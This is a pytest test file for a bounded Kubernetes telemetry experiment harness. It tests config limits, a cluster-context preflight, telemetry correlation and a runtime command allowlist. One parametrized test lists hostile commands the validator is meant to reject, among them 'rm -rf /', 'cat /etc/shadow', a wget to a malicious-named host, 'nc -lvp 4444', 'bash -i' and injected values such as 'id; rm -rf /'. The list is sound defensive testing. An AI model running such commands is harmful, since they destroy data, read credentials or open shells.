"""Tests for the repeatable, resource-bounded Kubernetes telemetry experiment harness."""

from __future__ import annotations

import csv
import json
from datetime import datetime, timezone
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from experiments.harness import (
    ALLOWED_RUNTIME_COMMANDS,
    HARD_LIMITS,
    ActivityResult,
    ExperimentMetadata,
    HarnessConfigError,
    HarnessExecutionError,
    ModalityCorrelation,
    ScenarioConfig,
    TelemetryHarness,
    compare_experiments,
    load_harness_config,
    validate_runtime_command,
    validate_scenario_config,
)
from telemetry.schemas import Endpoint, NetworkEvent, RuntimeEvent, WorkloadSample


@pytest.fixture
def sample_config() -> dict[str, Any]:
    return {
        "cluster": {
            "cluster_id": "minikube",
            "expected_context": "minikube",
            "namespace": "default",
            "target_workload": "deployment/webapp",
            "traffic_generator": "traffic-generator",
        },
        "output_directory": "experiments/harness_runs",
        "limits": {
            "max_duration_seconds": 30.0,
            "max_requests": 200,
            "max_workload_duration_seconds": 20.0,
            "max_runtime_commands": 20,
        },
        "telemetry_sources": {
            "network": "telemetry/data/network/network_events.jsonl",
            "workload": "telemetry/data/workload_metrics.csv",
            "runtime": "telemetry/data/runtime/runtime_events.jsonl",
        },
        "scenarios": {
            "baseline": {
                "description": "Low-rate HTTP requests to webapp",
                "requests": 10,
                "delay_seconds": 1.0,
                "timeout_seconds": 25.0,
            },
            "network_burst": {
                "description": "Controlled high-rate HTTP burst to webapp",
                "duration_seconds": 10.0,
                "max_requests": 60,
                "timeout_seconds": 25.0,
            },
            "runtime_activity": {
                "description": "Harmless in-container introspection commands",
                "commands": ["id", "uname -a", "date -u"],
                "delay_seconds": 0.5,
                "timeout_seconds": 20.0,
            },
            "workload_variation": {
                "description": "Modest bounded in-container CPU activity",
                "duration_seconds": 10.0,
                "timeout_seconds": 25.0,
            },
        },
    }


# ==============================================================================
# 1. Configuration Validation & Limits
# ==============================================================================

def test_load_harness_config_loads_valid_yaml(tmp_path: Path, sample_config: dict[str, Any]) -> None:
    cfg_file = tmp_path / "harness.yaml"
    import yaml
    cfg_file.write_text(yaml.dump(sample_config), encoding="utf-8")
    loaded = load_harness_config(cfg_file)
    assert loaded["cluster"]["expected_context"] == "minikube"
    assert "baseline" in loaded["scenarios"]


def test_validate_scenario_config_baseline_valid(sample_config: dict[str, Any]) -> None:
    sc = validate_scenario_config("baseline", sample_config)
    assert sc.name == "baseline"
    assert sc.requests == 10
    assert sc.delay_seconds == 1.0


def test_validate_scenario_config_network_burst_valid(sample_config: dict[str, Any]) -> None:
    sc = validate_scenario_config("network_burst", sample_config)
    assert sc.name == "network_burst"
    assert sc.duration_seconds == 10.0
    assert sc.max_requests == 60


def test_validate_scenario_config_runtime_activity_valid(sample_config: dict[str, Any]) -> None:
    sc = validate_scenario_config("runtime_activity", sample_config)
    assert sc.name == "runtime_activity"
    assert sc.commands == ("id", "uname -a", "date -u")
    assert sc.delay_seconds == 0.5


def test_validate_scenario_config_workload_variation_valid(sample_config: dict[str, Any]) -> None:
    sc = validate_scenario_config("workload_variation", sample_config)
    assert sc.name == "workload_variation"
    assert sc.duration_seconds == 10.0


def test_validate_scenario_config_rejects_unknown(sample_config: dict[str, Any]) -> None:
    with pytest.raises(HarnessConfigError, match="Unknown scenario"):
        validate_scenario_config("unsupported_attack", sample_config)


def test_validate_scenario_config_enforces_limits(sample_config: dict[str, Any]) -> None:
    # Exceed max requests
    sample_config["scenarios"]["baseline"]["requests"] = 500
    with pytest.raises(HarnessConfigError, match="exceeds limit"):
        validate_scenario_config("baseline", sample_config)

    # Exceed burst duration
    sample_config["scenarios"]["network_burst"]["duration_seconds"] = 120.0
    with pytest.raises(HarnessConfigError, match="exceeds limit"):
        validate_scenario_config("network_burst", sample_config)

    # Exceed workload duration
    sample_config["scenarios"]["workload_variation"]["duration_seconds"] = 100.0
    with pytest.raises(HarnessConfigError, match="exceeds limit"):
        validate_scenario_config("workload_variation", sample_config)


# ==============================================================================
# 2. Command Allowlist & Security Sanitization
# ==============================================================================

@pytest.mark.parametrize("cmd", list(ALLOWED_RUNTIME_COMMANDS))
def test_validate_runtime_command_approved_commands(cmd: str) -> None:
    assert validate_runtime_command(cmd) == cmd


@pytest.mark.parametrize("dangerous_cmd", [
    "rm -rf /",
    "cat /etc/shadow",
    "wget http://external.malicious.com",
    "curl http://1.2.3.4",
    "nc -lvp 4444",
    "bash -i",
    "id; rm -rf /",
    "whoami && reboot",
    "uname | sh",
    "date > /etc/passwd",
    "$(whoami)",
    "`id`",
])
def test_validate_runtime_command_rejects_dangerous(dangerous_cmd: str) -> None:
    with pytest.raises(HarnessConfigError):
        validate_runtime_command(dangerous_cmd)


def test_runtime_activity_rejects_empty_or_excessive_commands(sample_config: dict[str, Any]) -> None:
    sample_config["scenarios"]["runtime_activity"]["commands"] = []
    with pytest.raises(HarnessConfigError, match="requires a list of commands"):
        validate_scenario_config("runtime_activity", sample_config)

    sample_config["scenarios"]["runtime_activity"]["commands"] = ["id"] * 50
    with pytest.raises(HarnessConfigError, match="command count 50 exceeds limit"):
        validate_scenario_config("runtime_activity", sample_config)


# ==============================================================================
# 3. Preflight & Cluster Context Check
# ==============================================================================

def test_check_preflight_passes_for_expected_context(tmp_path: Path, sample_config: dict[str, Any]) -> None:
    harness = TelemetryHarness(config=sample_config, project_root=tmp_path)
    mock_run = lambda *args, **kwargs: SimpleNamespace(returncode=0, stdout="minikube\n")
    harness.check_preflight(run_cmd=mock_run)


def test_check_preflight_refuses_unexpected_context(tmp_path: Path, sample_config: dict[str, Any]) -> None:
    harness = TelemetryHarness(config=sample_config, project_root=tmp_path)
    mock_run = lambda *args, **kwargs: SimpleNamespace(returncode=0, stdout="production-cluster\n")
    with pytest.raises(HarnessExecutionError, match="Refusing execution"):
        harness.check_preflight(run_cmd=mock_run)


# ==============================================================================
# 4. Dry-Run Execution Mode
# ==============================================================================

def test_dry_run_creates_planned_metadata(tmp_path: Path, sample_config: dict[str, Any]) -> None:
    sample_config["output_directory"] = str(tmp_path / "runs")
    harness = TelemetryHarness(config=sample_config, project_root=tmp_path)

    run_dir, metadata, windows = harness.execute_experiment("baseline", dry_run=True)
    assert run_dir.exists()
    assert metadata.status == "planned"
    assert metadata.scenario == "baseline"
    assert len(windows) == 0

    saved_meta = json.loads((run_dir / "experiment_metadata.json").read_text(encoding="utf-8"))
    assert saved_meta["status"] == "planned"
    assert saved_meta["experiment_id"] == metadata.experiment_id


# ==============================================================================
# 5. Telemetry Correlation & Observation Windows
# ==============================================================================

def test_correlate_telemetry_captures_all_modalities(tmp_path: Path, sample_config: dict[str, Any]) -> None:
    # Set up dummy source files in tmp_path
    net_file = tmp_path / "net.jsonl"
    rt_file = tmp_path / "rt.jsonl"
    wl_file = tmp_path / "wl.csv"

    sample_config["telemetry_sources"] = {
        "network": str(net_file),
        "runtime": str(rt_file),
        "workload": str(wl_file),
    }
    sample_config["output_directory"] = str(tmp_path / "runs")

    # Write network event
    net_event = {
        "timestamp": "2026-10-13T05:10:02.000Z",
        "type": "accept",
        "src": {"addr": "10.244.0.5", "port": 80},
        "dst": {"addr": "10.244.0.9", "port": 45000},
        "k8s": {"podName": "webapp-xxx"},
        "error": "",
    }
    net_file.write_text(json.dumps(net_event) + "\n", encoding="utf-8")

    # Write runtime event
    rt_event = {
        "timestamp": "2026-10-13T05:10:04.000Z",
        "comm": "uname",
        "args": "uname -a",
        "proc": {"comm": "uname", "pid": 1234, "creds": {"uid": 0, "user": "root"}},
        "k8s": {"podName": "webapp-xxx"},
    }
    rt_file.write_text(json.dumps(rt_event) + "\n", encoding="utf-8")

    # Write workload sample
    wl_file.write_text(
        "timestamp,pod,cpu_millicores,memory_mib,label\n"
        "2026-10-13T05:10:05.000Z,webapp-xxx,15,16,normal\n",
        encoding="utf-8",
    )

    harness = TelemetryHarness(config=sample_config, project_root=tmp_path)
    correlations, windows, raw_slices = harness.correlate_telemetry(
        start_time_utc="2026-10-13T05:10:00.000Z",
        end_time_utc="2026-10-13T05:10:10.000Z",
    )

    # All three modalities should be captured
    assert correlations["network"].captured is True
    assert correlations["network"].record_count == 1
    assert correlations["network"].details["connection_count"] == 1

    assert correlations["runtime"].captured is True
    assert correlations["runtime"].record_count == 1
    assert "uname" in correlations["runtime"].details["unique_commands"]

    assert correlations["workload"].captured is True
    assert correlations["workload"].record_count == 1
    assert correlations["workload"].details["cpu_max_millicores"] == 15

    # 10s observation window created
    assert len(windows) == 1
    w = windows[0]
    assert w["window_start"] == "2026-10-13T05:10:00.000Z"
    assert w["network_available"] is True
    assert w["runtime_available"] is True
    assert w["workload_available"] is True


def test_correlate_telemetry_handles_missing_modalities_without_fabrication(
    tmp_path: Path, sample_config: dict[str, Any]
) -> None:
    # Empty files
    net_file = tmp_path / "net.jsonl"
    rt_file = tmp_path / "rt.jsonl"
    wl_file = tmp_path / "wl.csv"
    net_file.write_text("", encoding="utf-8")
    rt_file.write_text("", encoding="utf-8")
    wl_file.write_text("timestamp,pod,cpu_millicores,memory_mib,label\n", encoding="utf-8")

    sample_config["telemetry_sources"] = {
        "network": str(net_file),
        "runtime": str(rt_file),
        "workload": str(wl_file),
    }
    sample_config["output_directory"] = str(tmp_path / "runs")

    harness = TelemetryHarness(config=sample_config, project_root=tmp_path)
    correlations, windows, _ = harness.correlate_telemetry(
        start_time_utc="2026-10-13T05:10:00.000Z",
        end_time_utc="2026-10-13T05:10:10.000Z",
    )

    assert correlations["network"].captured is False
    assert correlations["network"].record_count == 0
    assert "No TCP events captured" in (correlations["network"].reason or "")

    assert correlations["runtime"].captured is False
    assert correlations["runtime"].record_count == 0
    assert "No process exec events" in (correlations["runtime"].reason or "")

    assert correlations["workload"].captured is False
    assert correlations["workload"].record_count == 0

    assert len(windows) == 0


# ==============================================================================
# 6. Baseline vs Activity Comparison
# ==============================================================================

def test_compare_experiments_calculates_deltas_and_exports_csv(tmp_path: Path) -> None:
    base_dir = tmp_path / "baseline_run"
    act_dir = tmp_path / "activity_run"
    base_dir.mkdir()
    act_dir.mkdir()

    base_meta = {
        "experiment_id": "20261013T050000Z_baseline_1111",
        "scenario": "baseline",
        "modality_correlations": {
            "network": {"details": {"connection_count": 10, "connection_rate": 1.0, "event_count": 20}},
            "runtime": {"details": {"exec_count": 0, "exec_rate": 0.0, "root_exec_count": 0}},
            "workload": {"details": {"cpu_mean_millicores": 2.0, "cpu_max_millicores": 5.0, "memory_mean_mib": 16.0}},
        },
    }
    act_meta = {
        "experiment_id": "20261013T050500Z_network_burst_2222",
        "scenario": "network_burst",
        "modality_correlations": {
            "network": {"details": {"connection_count": 50, "connection_rate": 5.0, "event_count": 100}},
            "runtime": {"details": {"exec_count": 4, "exec_rate": 0.4, "root_exec_count": 4}},
            "workload": {"details": {"cpu_mean_millicores": 25.0, "cpu_max_millicores": 80.0, "memory_mean_mib": 18.0}},
        },
    }

    (base_dir / "experiment_metadata.json").write_text(json.dumps(base_meta), encoding="utf-8")
    (act_dir / "experiment_metadata.json").write_text(json.dumps(act_meta), encoding="utf-8")

    out_csv = act_dir / "comparison.csv"
    cmp_dict, rows = compare_experiments(base_dir, act_dir, output_csv=out_csv)

    assert cmp_dict["baseline_experiment_id"] == "20261013T050000Z_baseline_1111"
    assert cmp_dict["activity_experiment_id"] == "20261013T050500Z_network_burst_2222"

    # Find network connection count delta
    conn_row = next(r for r in rows if r["metric"] == "connection_count")
    assert conn_row["baseline_value"] == 10
    assert conn_row["activity_value"] == 50
    assert conn_row["delta"] == 40
    assert conn_row["percent_change"] == "400.0%"

    # Check exported CSV
    assert out_csv.exists()
    with out_csv.open("r", encoding="utf-8") as handle:
        reader = list(csv.DictReader(handle))
    assert len(reader) == 9
